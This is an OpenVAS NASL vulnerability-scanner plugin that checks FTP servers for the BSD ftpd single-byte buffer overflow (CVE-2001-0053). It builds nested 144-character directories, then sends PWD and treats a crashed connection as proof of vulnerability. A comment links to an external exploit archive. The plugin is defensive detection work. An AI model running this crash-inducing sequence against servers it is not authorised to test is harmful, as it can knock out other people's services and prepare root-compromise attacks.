# OpenVAS Vulnerability Test
# $Id: ftpd_1byte_overflow.nasl 13610 2019-02-12 15:17:00Z cfischer $
# Description: BSD ftpd Single Byte Buffer Overflow
#
# Authors:
# Xue Yong Zhi<xueyong@udel.edu>
#
# Copyright:
# Copyright (C) 2003 Xue Yong Zhi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# exploit is available at:
# http://www.securityfocus.com/data/vulnerabilities/exploits/7350oftpd.tar.gz

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11371");
  script_version("$Revision: 13610 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-12 16:17:00 +0100 (Tue, 12 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(2124);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2001-0053");
  script_name("BSD ftpd Single Byte Buffer Overflow");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("FTP");
  script_copyright("This script is Copyright (C) 2003 Xue Yong Zhi");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "ftp_writeable_directories.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/login", "ftp/writeable_dir");

  script_tag(name:"solution", value:"Upgrade your FTP server.

  Consider removing directories writable by 'anonymous'.");

  script_tag(name:"summary", value:"One-byte buffer overflow in replydirname function
  in BSD-based ftpd allows remote attackers to gain root privileges.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("ftp_func.inc");

port = get_ftp_port(default:21);

function on_exit()
{
  soc = open_sock_tcp(port);
  if(soc) {
    ftp_log_in(socket:soc, user:login, pass:pass);
    send(socket:soc, data:string("CWD ", wri, "\r\n"));
    r = ftp_recv_line(socket:soc);
    for(j = 0; j < num_dirs - 1; j++) {
      send(socket:soc, data:string("CWD ", crap(144), "\r\n"));
      r = ftp_recv_line(socket:soc);
    }

    for( j = 0; j < num_dirs; j++) {
      send(socket:soc, data:string("RMD ", crap(144),  "\r\n"));
      r = ftp_recv_line(socket:soc);
      if(!ereg(pattern:"^250 .*", string:r))
        exit(0);
      send(socket:soc, data:string("CWD ..\r\n"));
      r = ftp_recv_line(socket:soc);
    }
  }
}

kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
pass = kb_creds["pass"];
if(!login)
  exit(0);

wri = get_kb_item("ftp/writeable_dir");
if(!wri)
  exit(0);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

if(!ftp_log_in(socket:soc, user:login, pass:pass)) {
  ftp_close(socket:soc);
  exit(0);
}

num_dirs = 0;
# We are in

c = string("CWD ", wri, "\r\n");
send(socket:soc, data:c);
b = ftp_recv_line(socket:soc);
cwd = string("CWD ", crap(144), "\r\n");
mkd = string("MKD ", crap(144), "\r\n");
rmd = string("RMD ", crap(144), "\r\n");
pwd = string("PWD \r\n");

# Repeat the same operation 20 times. After the 20th, we assume that the server is immune.
for(i=0;i<20;i=i+1) {

  send(socket:soc, data:mkd);
  b = ftp_recv_line(socket:soc);

  # No answer = the server has closed the connection.
  # The server should not crash after a MKD command
  # but who knows ?
  if(!b){
    #security_message(port);
    exit(0);
  }

  if(!ereg(pattern:"^257 .*", string:b)){
    i = 20;
  } else {
    send(socket:soc,data:cwd);
    b = ftp_recv_line(socket:soc);
    send(socket:soc, data:rmd);

    # See above. The server is unlikely to crash here
    if(!b) {
      #security_message(port);
      exit(0);
    }

    if(!ereg(pattern:"^250 .*", string:b)) {
      i = 20;
    } else {
      num_dirs++;
    }
  }
}

#If vunerable, it will crash here
send(socket:soc,data:pwd);
b = ftp_recv_line(socket:soc);
if(!b) {
  security_message(port:port);
  exit(0);
}

ftp_close(socket:soc);
